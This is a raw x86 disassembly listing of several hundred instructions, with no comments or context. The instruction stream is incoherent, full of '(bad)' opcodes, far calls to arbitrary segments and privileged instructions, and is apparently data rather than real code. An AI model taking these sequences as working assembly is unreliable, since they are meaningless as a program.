  42b19a:	call   0x2d7e:0xef3f3f9
  42b1a1:	or     eax,DWORD PTR [esp+ebp*2]
  42b1a4:	mov    es,WORD PTR [ebp+0x10b80faa]
  42b1aa:	call   0x760c:0x226b9c53
  42b1b1:	leave  
  42b1b2:	lahf   
  42b1b3:	sahf   
  42b1b4:	xchg   ecx,eax
  42b1b5:	ret    0x419a
  42b1b8:	addr16 mov cl,0x38
  42b1bb:	pushf  
  42b1bc:	jb     0x42b184
  42b1be:	call   0xe874:0xb8c35526
  42b1c5:	leave  
  42b1c6:	add    al,BYTE PTR [ecx-0x573c7e38]
  42b1cc:	(bad)
  42b1d0:	pop    es
  42b1d1:	pop    ds
  42b1d2:	mov    bl,0x6d
  42b1d4:	(bad)
  42b1d7:	adc    eax,0x6eba75c6
  42b1dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1dd:	loop   0x42b1c1
  42b1df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1e0:	sub    BYTE PTR [edx-0x25],dl
  42b1e3:	gs jne 0x42b18f
  42b1e6:	sbb    bh,BYTE PTR [eax-0x2d65a338]
  42b1ec:	jns    0x42b1e1
  42b1ee:	iret   
  42b1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1f0:	hlt    
  42b1f1:	sar    DWORD PTR [ebx+0x63aeeca0],0x9a
  42b1f8:	int    0xeb
  42b1fa:	jl     0x42b1d9
  42b1fc:	jmp    0x8e714cc9
  42b201:	fld    TBYTE PTR [edx]
  42b203:	add    eax,0xa7e725ba
  42b208:	xchg   ecx,eax
  42b209:	push   es
  42b20a:	or     eax,0x28d8337
  42b20f:	out    dx,eax
  42b210:	lea    ebx,[edi-0x2695d8d3]
  42b216:	iret   
  42b217:	dec    edx
  42b218:	sahf   
  42b219:	push   ds
  42b21a:	scas   al,BYTE PTR es:[edi]
  42b21b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b21d:	mov    ds:0x876f5d85,al
  42b222:	mov    WORD PTR [ebp*4+0x77819622],?
  42b229:	pop    ebx
  42b22a:	es xchg edi,eax
  42b22c:	mov    dh,0xee
  42b22e:	fucomp st(2)
  42b230:	add    dl,BYTE PTR [ebx]
  42b232:	inc    eax
  42b233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b234:	imul   edx,DWORD PTR [esi-0x40],0xfffffff2
  42b238:	fbstp  TBYTE PTR [ebp-0x27]
  42b23b:	lods   eax,DWORD PTR ds:[esi]
  42b23c:	push   esi
  42b23d:	retf   0x429a
  42b240:	cmp    BYTE PTR [eax],ch
  42b242:	pop    edx
  42b243:	xchg   ebp,eax
  42b244:	pop    edi
  42b245:	pop    ds
  42b246:	or     eax,0x819fcfa7
  42b24b:	sub    cl,BYTE PTR [ecx+0x3f]
  42b24e:	aaa    
  42b24f:	fwait
  42b250:	mov    esp,0xb8a4eb2c
  42b255:	and    al,0x6b
  42b257:	addr16 shl dh,1
  42b25a:	(bad)  
  42b25c:	daa    
  42b25d:	or     esi,eax
  42b25f:	pop    edx
  42b260:	dec    eax
  42b261:	xchg   DWORD PTR [edx+0x0],esp
  42b264:	test   eax,0xda049a74
  42b269:	xor    BYTE PTR [ecx],dl
  42b26b:	jge    0x42b280
  42b26d:	ss out 0xa7,al
  42b270:	inc    esp
  42b271:	loopne 0x42b2b6
  42b273:	xchg   ebx,eax
  42b274:	xchg   DWORD PTR [ecx+0x108fcbba],esp
  42b27a:	(bad)  
  42b27b:	pushf  
  42b27c:	inc    ecx
  42b27d:	mov    esp,ebx
  42b27f:	xchg   ebp,eax
  42b280:	sub    eax,0xb93a4d0e
  42b285:	or     al,0x96
  42b287:	hlt    
  42b288:	and    eax,0x37e7208c
  42b28d:	shl    BYTE PTR [eax+0x6b8dafeb],1
  42b293:	sub    esi,ebx
  42b295:	adc    dh,BYTE PTR [edx-0x5c]
  42b298:	cmp    al,0xe6
  42b29a:	push   edx
  42b29b:	cs pushf 
  42b29d:	or     al,0x22
  42b29f:	aad    0x68
  42b2a1:	push   DWORD PTR [ecx+0x47]
  42b2a4:	data16 xor dh,BYTE PTR [esi-0x26]
  42b2a8:	mov    eax,ds:0xb2f012ac
  42b2ad:	repz imul DWORD PTR [esi-0x17]
  42b2b1:	inc    ebp
  42b2b2:	mov    ah,0xa7
  42b2b4:	push   DWORD PTR [esi]
  42b2b6:	xor    ah,BYTE PTR [ebp-0x61d39e6b]
  42b2bc:	mov    dl,0xf0
  42b2be:	or     eax,DWORD PTR [esi-0xe]
  42b2c1:	push   edi
  42b2c2:	jmp    0x804ea238
  42b2c7:	bound  ebx,QWORD PTR [eax+0x50554226]
  42b2cd:	out    dx,eax
  42b2ce:	or     ah,ah
  42b2d0:	mov    dl,0xc7
  42b2d2:	inc    edi
  42b2d3:	push   eax
  42b2d4:	ds jle 0x42b2a5
  42b2d7:	addr16 popw ss
  42b2da:	ret    0xa963
  42b2dd:	or     ebp,DWORD PTR [eax+0x4ac422e0]
  42b2e3:	adc    al,0xb2
  42b2e5:	cmp    eax,0xc1a16e07
  42b2ea:	push   ss
  42b2eb:	dec    edi
  42b2ec:	fimul  DWORD PTR [esi+ebp*2]
  42b2ef:	add    DWORD PTR [eax+eax*4],esp
  42b2f2:	jae    0x42b33b
  42b2f4:	gs mov edx,0xab5965e
  42b2fa:	mov    esp,0x8a81b145
  42b2ff:	pop    ds
  42b300:	jge    0x42b2e8
  42b302:	and    eax,0xb5e2e6b9
  42b307:	daa    
  42b308:	shr    al,1
  42b30a:	jp     0x42b296
  42b30c:	sub    al,BYTE PTR [ebx]
  42b30e:	call   0x46be:0x91d9b66b
  42b315:	sub    eax,0x451aa8fb
  42b31a:	jo     0x42b2ef
  42b31c:	repnz mov ebx,0xbedee10b
  42b322:	jle    0x42b37e
  42b324:	mov    al,ah
  42b326:	xor    esp,DWORD PTR [esi-0xe873270]
  42b32c:	cwde   
  42b32d:	fs jp  0x42b326
  42b330:	mov    dh,0xb
  42b332:	pop    ebx
  42b333:	pusha  
  42b334:	cmp    al,0x1c
  42b336:	or     al,0x6d
  42b338:	sbb    edi,ebp
  42b33a:	call   0xf5a2:0x177ae224
  42b341:	lahf   
  42b342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b344:	and    esi,DWORD PTR [esi-0x43e08b8f]
  42b34a:	leave  
  42b34b:	pop    ebx
  42b34c:	mov    dh,0xc
  42b34e:	call   0xc0d7:0x53fdc434
  42b355:	push   ds
  42b356:	hlt    
  42b357:	mov    edi,0xb17409cc
  42b35c:	es push edi
  42b35e:	call   0x5e4f:0xc23d96de
  42b365:	div    DWORD PTR [eax-0x59]
  42b368:	div    DWORD PTR [ecx]
  42b36a:	jae    0x42b3b8
  42b36c:	sbb    eax,0xb209f6f9
  42b371:	pushf  
  42b372:	fimul  DWORD PTR [edx-0x7b1c93dc]
  42b378:	or     ecx,DWORD PTR [ebx]
  42b37a:	je     0x42b3fa
  42b37c:	xor    dl,dh
  42b37e:	(bad)  
  42b37f:	jne    0x42b32b
  42b381:	shr    esp,1
  42b383:	hlt    
  42b384:	out    dx,al
  42b385:	mov    dh,0xa0
  42b387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b388:	adc    DWORD PTR [eax+0xefeca0d],edi
  42b38e:	stos   BYTE PTR es:[edi],al
  42b38f:	push   es
  42b390:	mov    ds:0xe2f90a0b,eax
  42b395:	adc    DWORD PTR [esi-0x7a],ebx
  42b398:	outs   dx,DWORD PTR ds:[esi]
  42b399:	in     al,0x95
  42b39b:	jne    0x42b3dd
  42b39d:	pop    DWORD PTR [eax-0x79]
  42b3a0:	dec    eax
  42b3a1:	jno    0x42b3b0
  42b3a3:	push   cs
  42b3a4:	sbb    DWORD PTR [edi],edx
  42b3a6:	mov    ds:0x648bbf8c,al
  42b3ab:	mov    bh,0xd1
  42b3ad:	cld    
  42b3ae:	sbb    al,0x41
  42b3b0:	mov    dl,0x51
  42b3b2:	ret    0x41a5
  42b3b5:	fidiv  WORD PTR [ebx-0x68]
  42b3b8:	cmp    ecx,DWORD PTR [ebx]
  42b3ba:	push   cs
  42b3bb:	ror    BYTE PTR [ebx],1
  42b3bd:	scas   eax,DWORD PTR es:[edi]
  42b3be:	xchg   edi,eax
  42b3bf:	iret   
  42b3c0:	xchg   BYTE PTR [esi],dh
  42b3c2:	call   0xd5d2:0x2090c8eb
  42b3c9:	adc    eax,0xf81da7c5
  42b3ce:	mov    al,ds:0x1798522f
  42b3d3:	ja     0x42b387
  42b3d5:	pop    ebp
  42b3d6:	xor    cl,BYTE PTR gs:[eax+ecx*4+0xc6c414]
  42b3de:	ins    BYTE PTR es:[edi],dx
  42b3df:	imul   esp,DWORD PTR [eax+0x2e],0xfecb5c1a
  42b3e6:	mov    esp,0x3653b2b3
  42b3eb:	jae    0x42b3ca
  42b3ed:	shr    DWORD PTR [edi-0x6d06f3c2],1
  42b3f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3f4:	adc    BYTE PTR [esi-0x75],0xe
  42b3f8:	mov    ebp,0xb34dbb71
  42b3fd:	lock xor al,0xec
  42b400:	iret   
  42b401:	cwde   
  42b402:	leave  
  42b403:	jnp    0x42b463
  42b405:	sbb    eax,0x1626a77b
  42b40a:	xchg   bh,dl
  42b40c:	ja     0x42b417
  42b40e:	std    
  42b40f:	div    DWORD PTR [edx-0x7b2aea30]
  42b415:	aas    
  42b416:	push   edi
  42b417:	and    BYTE PTR [edi],bh
  42b419:	pop    ss
  42b41a:	mov    eax,ds:0xf3cbd13a
  42b41f:	dec    BYTE PTR [ebx*1-0x374d3a8e]
  42b426:	xor    esi,DWORD PTR [esi-0x7f]
  42b429:	xor    eax,0xbff17c6
  42b42e:	inc    edi
  42b42f:	add    eax,esi
  42b431:	ret    
  42b432:	mov    esi,0x9ad76605
  42b437:	mov    al,0x75
  42b439:	popa   
  42b43a:	rcl    ebp,1
  42b43c:	inc    esi
  42b43d:	xor    cl,bh
  42b43f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b440:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42b442:	in     eax,0xe1
  42b444:	push   0x51
  42b446:	mov    ecx,0x99b540c3
  42b44b:	fstp   st(2)
  42b44d:	pop    edi
  42b44e:	shl    DWORD PTR [ebx+0x56],cl
  42b451:	mov    ds:0xb65ceda,eax
  42b456:	aam    0xcc
  42b458:	dec    ecx
  42b459:	cmp    eax,0xfd557458
  42b45e:	call   0xb9c9:0x361813cd
  42b465:	inc    edi
  42b466:	imul   esp,DWORD PTR [edi-0x69066688],0xffffffaa
  42b46d:	ss xchg edi,eax
  42b46f:	inc    edx
  42b470:	mov    dl,0x15
  42b472:	shl    DWORD PTR [edi-0x688131c5],0x4c
  42b479:	or     edx,DWORD PTR [ebp+0x1c]
  42b47c:	aam    0x9b
  42b47e:	fwait
  42b47f:	outs   dx,DWORD PTR ds:[esi]
  42b480:	iret   
  42b481:	xchg   edi,eax
  42b482:	call   0xeb2:0x8e69f417
  42b489:	pop    edi
  42b48a:	sbb    BYTE PTR [ebx+ebp*2+0x12a76252],bl
  42b491:	cli    
  42b492:	xchg   esi,eax
  42b493:	inc    esi
  42b494:	cmp    al,0xbe
  42b496:	xor    dh,BYTE PTR [edi-0x78cbdb4e]
  42b49c:	cld    
  42b49d:	jmp    DWORD PTR [ebx-0x5ece1893]
  42b4a3:	cmc    
  42b4a4:	lods   al,BYTE PTR ds:[esi]
  42b4a5:	fwait
  42b4a6:	ja     0x42b48e
  42b4a8:	and    bh,0xb5
  42b4ab:	das    
  42b4ac:	adc    DWORD PTR [edx],edi
  42b4ae:	and    esp,DWORD PTR [edi]
  42b4b0:	int3   
  42b4b1:	test   DWORD PTR [ebp+eiz*2-0x19],ebx
  42b4b5:	mov    ebx,0xb95ca725
  42b4ba:	adc    ebx,esi
  42b4bc:	adc    ch,BYTE PTR [eax]
  42b4be:	mov    ch,0xaa
  42b4c0:	mov    dl,0x73
  42b4c2:	fwait
  42b4c3:	xor    DWORD PTR [eax],ebx
  42b4c5:	add    BYTE PTR [ecx-0x34808625],al
  42b4cb:	mov    al,ds:0x29fc2f2d
  42b4d0:	cmp    DWORD PTR [ebx],0x6c096371
  42b4d6:	cmp    edi,DWORD PTR [eax+0x66]
  42b4d9:	sub    ebp,DWORD PTR [eax]
  42b4db:	je     0x42b489
  42b4dd:	mov    dh,0xa4
  42b4df:	xor    eax,0xf45b1772
  42b4e4:	adc    eax,0x57a7ffe2
  42b4e9:	je     0x42b4d3
  42b4eb:	mov    ds:0xddb17231,al
  42b4f0:	mov    dl,0x7f
  42b4f2:	add    al,0x12
  42b4f4:	popf   
  42b4f5:	jle    0x42b570
  42b4f7:	mov    bh,0x1c
  42b4f9:	or     ecx,DWORD PTR [ebp-0x45c5fef1]
  42b4ff:	pop    ebx
  42b500:	test   esp,esp
  42b502:	jo     0x42b4c7
  42b504:	mov    dl,0xb2
  42b506:	dec    ebx
  42b507:	das    
  42b508:	xor    eax,0xcb33b109
  42b50d:	or     edx,eax
  42b50f:	popf   
  42b510:	and    eax,0xa1beee7
  42b515:	repnz call 0x2021:0xc22bda73
  42b51d:	jns    0x42b543
  42b51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b520:	mov    al,ds:0xbb8680aa
  42b525:	cmp    ebp,esp
  42b527:	pop    eax
  42b528:	mov    bl,0xd0
  42b52a:	and    bh,BYTE PTR [eax+0x22f05127]
  42b530:	jle    0x42b563
  42b532:	shl    DWORD PTR [edi+0x3820fc01],cl
  42b538:	or     eax,0xb2a5fd21
  42b53d:	loop   0x42b597
  42b53f:	into   
  42b540:	in     al,0x50
  42b542:	and    esp,DWORD PTR [edx-0x79]
  42b545:	or     esi,DWORD PTR [ebp-0x36]
  42b548:	js     0x42b591
  42b54a:	xchg   ecx,eax
  42b54b:	clc    
  42b54c:	lods   al,BYTE PTR ds:[esi]
  42b54d:	call   0xffea:0xb63cf59d
  42b554:	bound  esp,QWORD PTR [ebx+0x5ab444f]
  42b55a:	mov    ebp,0xdacd54c7
  42b55f:	mov    ah,0x4d
  42b561:	sti    
  42b562:	das    
  42b563:	shl    BYTE PTR [edx+0x72b6d276],1
  42b569:	stos   DWORD PTR es:[edi],eax
  42b56a:	lds    edx,FWORD PTR ds:0xf7420b0f
  42b570:	sbb    dl,BYTE PTR [edi]
  42b572:	mov    WORD PTR [ebx+0x8],?
  42b575:	call   0xdc999ae0
  42b57a:	call   0x7a62:0x3f5d5c7d
  42b581:	dec    edx
  42b583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b584:	div    BYTE PTR [ebp+0x27cf9a14]
  42b58a:	or     bh,BYTE PTR [esi-0x4e]
  42b58d:	adc    cl,dh
  42b58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b590:	mov    ds:0x66fab5c7,eax
  42b595:	fwait
  42b596:	pop    ss
  42b597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b598:	scas   al,BYTE PTR es:[edi]
  42b599:	pop    ebx
  42b59a:	push   ebp
  42b59b:	popa   
  42b59c:	add    bl,BYTE PTR [esi+0x3f]
  42b59f:	sub    eax,0x24337db2
  42b5a4:	test   DWORD PTR [edi+0x1f42c94c],0xeb3b6e3d
  42b5ae:	fwait
  42b5af:	pop    esi
  42b5b0:	ret    0xad6d
  42b5b3:	not    eax
  42b5b5:	out    dx,eax
  42b5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5b7:	pusha  
  42b5b8:	lods   al,BYTE PTR ds:[esi]
  42b5b9:	rol    DWORD PTR [ebx+0x318e3230],0x5f
  42b5c0:	mov    esp,0xe8b5077e
  42b5c5:	dec    ebx
  42b5c6:	aaa    
  42b5c7:	test   eax,0x1b3a8d3c
  42b5cc:	sbb    eax,edx
  42b5ce:	mov    edi,0xd522b3e4
  42b5d3:	jmp    0x8942f46
  42b5d8:	xchg   edx,eax
  42b5d9:	out    0xb9,al
  42b5db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b5dc:	hlt    
  42b5dd:	mov    dl,0x63
  42b5df:	adc    ebx,DWORD PTR [edx+0x2c6bd986]
  42b5e5:	aaa    
  42b5e6:	call   0xd877:0xff407161
  42b5ed:	das    
  42b5ee:	setge  dh
  42b5f1:	mov    al,0x1a
  42b5f3:	mov    dl,0xb5
  42b5f5:	or     cl,BYTE PTR [eax]
  42b5f7:	outs   dx,BYTE PTR ds:[esi]
  42b5f8:	cmc    
  42b5f9:	(bad)  
  42b5fa:	call   0xfc4f:0x37a74dab
  42b601:	mov    edx,0x9087a71f
  42b606:	jae    0x42b665
  42b608:	mov    esp,DWORD PTR [ecx+0x2db2286f]
  42b60e:	bound  ecx,QWORD PTR [eax-0x61]
  42b611:	xor    eax,0xb4bca42
  42b616:	mov    cr4,esi
  42b619:	pop    esp
  42b61a:	stos   BYTE PTR es:[edi],al
  42b61b:	cmp    edx,ebp
  42b61d:	nop
  42b61e:	xchg   esp,eax
  42b61f:	inc    esp
  42b620:	(bad)  
  42b621:	or     ebx,eax
  42b623:	js     0x42b692
  42b625:	jns    0x42b601
  42b627:	adc    edi,DWORD PTR [esi+0x3dc65b49]
  42b62d:	or     ecx,DWORD PTR [ecx+ebx*2]
  42b630:	lea    ebx,[edx-0x6d4eab08]
  42b636:	call   0x574e:0xd27dcbfd
  42b63d:	retf   0xa772
  42b640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b641:	mov    al,ds:0x2ad3fe3a
  42b646:	adc    al,0x64
  42b648:	mov    dl,0x64
  42b64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b64b:	sbb    eax,0xd7fc13f2
  42b650:	jle    0x42b65d
  42b652:	sbb    al,0xc2
  42b654:	adc    DWORD PTR [edi-0x6f],ebp
  42b657:	loope  0x42b6c0
  42b659:	mov    ebp,0xcbe7799a
  42b65e:	test   BYTE PTR [edi],0x64
  42b661:	int    0x11
  42b663:	mov    bl,0xe2
  42b665:	cmp    ebp,DWORD PTR [edi+0x43e1b30e]
  42b66b:	sub    DWORD PTR [esi+ebx*1+0x1f],ebp
  42b66f:	dec    edi
  42b670:	dec    ecx
  42b671:	outs   dx,BYTE PTR ds:[esi]
  42b672:	call   0x364:0xb13153f5
  42b679:	mov    esi,0x6a3fa79c
  42b67e:	lock dec esp
  42b680:	cmc    
  42b681:	jns    0x42b6d7
  42b683:	inc    esp
  42b684:	mov    dl,0x57
  42b686:	xor    bl,BYTE PTR [ebx]
  42b688:	fs xchg ebx,eax
  42b68a:	inc    ebp
  42b68b:	push   ecx
  42b68c:	mov    BYTE PTR [ebx],cl
  42b68e:	nop
  42b68f:	std    
  42b690:	ss repnz push ebp
  42b693:	pop    ebx
  42b694:	nop
  42b695:	rol    BYTE PTR [ebp-0x265350ef],cl
  42b69b:	ret    
  42b69c:	adc    DWORD PTR [ebx+0x77],ecx
  42b69f:	pop    eax
  42b6a0:	mov    eax,ds:0xc1676739
  42b6a5:	pop    edi
  42b6a6:	sti    
  42b6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6a8:	jmp    0x4508479d
  42b6ad:	push   es
  42b6ae:	jl     0x42b6ec
  42b6b0:	mov    dl,0x92
  42b6b2:	mov    esi,0x71fa2a44
  42b6b7:	push   0xa8ba0b82
  42b6bc:	retf   
  42b6bd:	(bad)  
  42b6be:	pop    ecx
  42b6bf:	jnp    0x42b680
  42b6c1:	xor    al,0x9a
  42b6c3:	jns    0x42b738
  42b6c5:	ins    BYTE PTR es:[edi],dx
  42b6c6:	int    0xe7
  42b6c8:	fsubp  st(0),st
  42b6ca:	mov    ds:0x500b42d7,al
  42b6cf:	jl     0x42b66d
  42b6d1:	push   eax
  42b6d2:	cld    
  42b6d3:	mov    al,ds:0xde22012b
  42b6d8:	mov    dl,0x11
  42b6da:	mov    esi,0xaab96d76
  42b6df:	or     esp,DWORD PTR [ecx]
  42b6e1:	or     esi,DWORD PTR [ecx]
  42b6e3:	test   BYTE PTR [edi],ch
  42b6e5:	jo     0x42b6ef
  42b6e7:	mov    BYTE PTR [ebx+0x54819ad2],bh
  42b6ed:	gs push ebp
  42b6ef:	xor    DWORD PTR [edi+0x4aa746b1],ebx
  42b6f5:	fld    QWORD PTR ds:[esi+0x1e]
  42b6f9:	or     BYTE PTR [eax+edx*2-0x4e],ah
  42b6fd:	(bad)
  42b700:	inc    edx
  42b701:	jns    0x42b69e
  42b703:	mov    ds:0x79830b0c,eax
  42b708:	bound  esp,QWORD PTR [ebx+0x27a11c81]
  42b70e:	call   0x28f2:0xcae56ff9
  42b715:	jo     0x42b707
  42b717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b718:	stos   DWORD PTR es:[edi],eax
  42b719:	push   0x39403bb3
  42b71e:	push   ebp
  42b71f:	mov    ds:0xffb7c08f,eax
  42b724:	mov    ecx,DWORD PTR [eax]
  42b726:	mov    edi,0x131f3cc8
  42b72b:	js     0x42b783
  42b72d:	sbb    ebx,DWORD PTR [edx-0x49]
  42b730:	retf   
  42b731:	arpl   di,cx
  42b733:	shl    dl,cl
  42b735:	or     eax,0xc64f0b02
  42b73a:	mov    ds:0x3badb287,al
  42b73f:	or     BYTE PTR [ecx],0xa5
  42b742:	push   eax
  42b743:	sub    al,0xeb
  42b745:	or     edi,DWORD PTR [eax-0x34]
  42b748:	xor    al,0x3d
  42b74a:	sbb    BYTE PTR [esi+0x45],0x73
  42b74e:	call   0xa34e:0xdf62741d
  42b755:	xchg   ebp,eax
  42b756:	lea    esp,[edi-0x5d7bf907]
  42b75c:	iret   
  42b75d:	lods   eax,DWORD PTR ds:[esi]
  42b75e:	or     BYTE PTR [edx-0x4e],0x7d
  42b762:	jp     0x42b764
  42b764:	mov    bl,0x53
  42b766:	mov    ch,bl
  42b768:	push   es
  42b769:	or     ebx,DWORD PTR [eax+0xf2554f5]
  42b76f:	fmul   st(5),st
  42b771:	aam    0x9a
  42b773:	cs push edi
  42b775:	mov    esi,0x24bccd0a
  42b77a:	pop    ss
  42b77b:	pushf  
  42b77c:	xchg   DWORD PTR [esi+0x1a],ecx
  42b77f:	imul   ecx,DWORD PTR [esi+0x257c6b71],0xb1bb9a53
  42b789:	mov    ecx,0x54395a05
  42b78e:	add    al,0x7
  42b790:	jl     0x42b754
  42b792:	and    eax,0x1fa4cda7
  42b797:	push   ss
  42b798:	ret    0xd5c1
  42b79b:	jne    0x42b7f6
  42b79d:	cmp    eax,edx
  42b79f:	mov    ecx,esi
  42b7a1:	enter  0x349a,0xb3
  42b7a5:	xor    BYTE PTR [ebx-0x3c],bl
  42b7a8:	or     eax,0x49a727af
  42b7ad:	dec    edi
  42b7ae:	mov    al,0xdc
  42b7b0:	popf   
  42b7b1:	jp     0x42b75d
  42b7b3:	mov    esp,0x44b122b2
  42b7b8:	stos   BYTE PTR es:[edi],al
  42b7b9:	dec    DWORD PTR [ecx+0x75]
  42b7bc:	and    eax,0x5f4ccb0b
  42b7c1:	retf   
  42b7c2:	xor    al,0xe0
  42b7c4:	sti    
  42b7c5:	xchg   edx,eax
  42b7c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7c7:	inc    ebp
  42b7c8:	and    ecx,DWORD PTR [ebx]
  42b7ca:	pop    ebx
  42b7cb:	jl     0x42b7a2
  42b7cd:	fsubrp st(5),st
  42b7cf:	stos   DWORD PTR es:[edi],eax
  42b7d0:	add    DWORD PTR [edx],eax
  42b7d2:	mov    ah,0x33
  42b7d4:	jnp    0x42b790
  42b7d6:	call   0xb269:0x6e328591
  42b7dd:	mov    dh,0xee
  42b7df:	pop    es
  42b7e0:	pop    esi
  42b7e1:	and    bh,ch
  42b7e3:	adc    BYTE PTR [edi+0x4],dl
  42b7e6:	(bad)  
  42b7e7:	into   
  42b7e8:	add    DWORD PTR [ebp+0x7a],esi
  42b7eb:	jp     0x42b7b0
  42b7ed:	sbb    DWORD PTR [ebx-0x3e],eax
  42b7f0:	mov    dl,0x8b
  42b7f2:	mov    dl,0x7f
  42b7f4:	push   ds
  42b7f5:	jnp    0x42b829
  42b7f7:	pop    edx
  42b7f8:	add    esp,DWORD PTR ds:0xb50c7ae
  42b7fe:	rcr    edi,cl
  42b800:	scas   al,BYTE PTR es:[edi]
  42b801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b802:	push   esp
  42b803:	je     0x42b7b2
  42b805:	xor    al,0xc6
  42b807:	xchg   ecx,eax
  42b808:	lods   eax,DWORD PTR ds:[esi]
  42b809:	pop    esp
  42b80a:	pop    edx
  42b80b:	movzx  eax,sp
  42b80e:	je     0x42b82c
  42b810:	dec    edx
  42b811:	push   ss
  42b812:	ja     0x42b7f8
  42b814:	cld    
  42b815:	retf   0x524
  42b818:	xchg   ebx,eax
  42b819:	and    DWORD PTR [ebx-0x64ec41a9],esi
  42b81f:	aas    
  42b820:	test   al,0xaa
  42b822:	dec    edx
  42b823:	adc    DWORD PTR [ecx+0x129876ad],ecx
  42b829:	or     edx,DWORD PTR [ecx+ecx*4-0x31]
  42b82d:	sbb    al,0x3d
  42b82f:	and    eax,0x629a264d
  42b834:	xor    ch,BYTE PTR [ebp+0x32]
  42b837:	icebp  
  42b838:	mov    al,ds:0xe5bb8238
  42b83d:	dec    edx
  42b83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b83f:	out    0xc2,eax
  42b841:	(bad)  
  42b842:	mov    ds:0x9a803f30,eax
  42b847:	fld    TBYTE PTR [ebx+eiz*8+0x4e]
  42b84b:	cld    
  42b84c:	mov    ebp,0x72a7fca7
  42b851:	mov    edx,0xf71f619b
  42b856:	mov    eax,ds:0x1f49b26f
  42b85b:	push   es
  42b85c:	cmp    edx,DWORD PTR [eax+ebp*1-0x2ed2202b]
  42b863:	mov    ds:0x14f00b66,eax
  42b868:	xor    BYTE PTR [eax-0x644d0984],dh
  42b86e:	fsubr  st,st(5)
  42b870:	xchg   edx,eax
  42b871:	xchg   esp,eax
  42b872:	mov    bh,0xaf
  42b874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b875:	das    
  42b876:	js     0x42b8e6
  42b878:	push   esp
  42b879:	or     al,0x6f
  42b87b:	or     DWORD PTR [eax+edi*2],ebp
  42b87e:	ror    BYTE PTR [edx+ebx*2-0x13],0x1c
  42b883:	dec    eax
  42b884:	mov    cl,0x22
  42b886:	pop    ecx
  42b887:	shl    DWORD PTR [ecx],cl
  42b889:	inc    eax
  42b88a:	jge    0x42b89a
  42b88c:	push   cs
  42b88d:	jl     0x42b849
  42b88f:	jae    0x42b873
  42b891:	add    al,0xd9
  42b893:	push   eax
  42b894:	jle    0x42b869
  42b896:	call   0xceab:0xac3ac8c0
  42b89d:	mov    ds,WORD PTR [edx-0x71a8bca9]
  42b8a3:	into   
  42b8a4:	shr    DWORD PTR [eax-0x48a7589d],cl
  42b8aa:	mov    DWORD PTR [eax+ecx*8],edx
  42b8ad:	call   0x27f7:0x168d17ff
  42b8b4:	cmp    eax,0xfac85e7f
  42b8b9:	je     0x42b85c
  42b8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8bc:	in     al,dx
  42b8bd:	pop    ss
  42b8be:	mov    esp,0xcc87b949
  42b8c3:	mov    eax,0x3bb893b2
  42b8c8:	push   0xffffff8c
  42b8ca:	sub    al,0x70
  42b8cc:	mov    al,ds:0x506f5b0b
  42b8d1:	jge    0x42b8eb
  42b8d3:	imul   ebp,DWORD PTR [ecx],0x33
  42b8d6:	call   0x6a1d:0xd9d4fb35
  42b8dd:	cmp    edi,DWORD PTR [ebp-0x5a]
  42b8e0:	mov    dh,0x2a
  42b8e2:	push   ds
  42b8e3:	pop    es
  42b8e4:	adc    eax,DWORD PTR [edi]
  42b8e6:	inc    edi
  42b8e7:	xlat   BYTE PTR ds:[ebx]
  42b8e8:	cli    
  42b8e9:	mov    al,0x64
  42b8eb:	ja     0x42b89f
  42b8ed:	scas   al,BYTE PTR es:[edi]
  42b8ee:	xchg   ebx,eax
  42b8ef:	xchg   ebx,eax
  42b8f0:	add    ebp,DWORD PTR [eax+0x162692cd]
  42b8f6:	xchg   esp,eax
  42b8f7:	sbb    ch,BYTE PTR [edi-0x2d694035]
  42b8fd:	lods   al,BYTE PTR ds:[esi]
  42b8fe:	mov    al,0xc6
  42b900:	mov    bl,ch
  42b902:	jmp    0x42b8ac
  42b904:	in     eax,dx
  42b905:	mov    dh,al
  42b907:	pop    edx
  42b908:	jb     0x42b945
  42b90a:	cmp    BYTE PTR [ecx],dh
  42b90c:	mov    esi,0x3ea82a8c
  42b911:	push   0xd21201fe
  42b916:	jne    0x42b8b4
  42b918:	ins    BYTE PTR es:[edi],dx
  42b919:	and    bl,BYTE PTR [edx-0x5b399cdb]
  42b91f:	sbb    cl,BYTE PTR [ebx+0x33a7948f]
  42b925:	add    BYTE PTR [esi],al
  42b927:	popa   
  42b928:	lock xlat BYTE PTR ds:[ebx]
  42b92a:	aas    
  42b92b:	mov    esi,DWORD PTR [edx-0x489eeb0]
  42b931:	js     0x42b8dc
  42b933:	jb     0x42b8bc
  42b935:	or     eax,DWORD PTR [ebp+0x20]
  42b938:	jg     0x42b91d
  42b93a:	cmc    
  42b93b:	(bad)  
  42b93c:	(bad)  
  42b93d:	jg     0x42b9b1
  42b93f:	jmp    0x4cf01cf9
  42b944:	jle    0x42b995
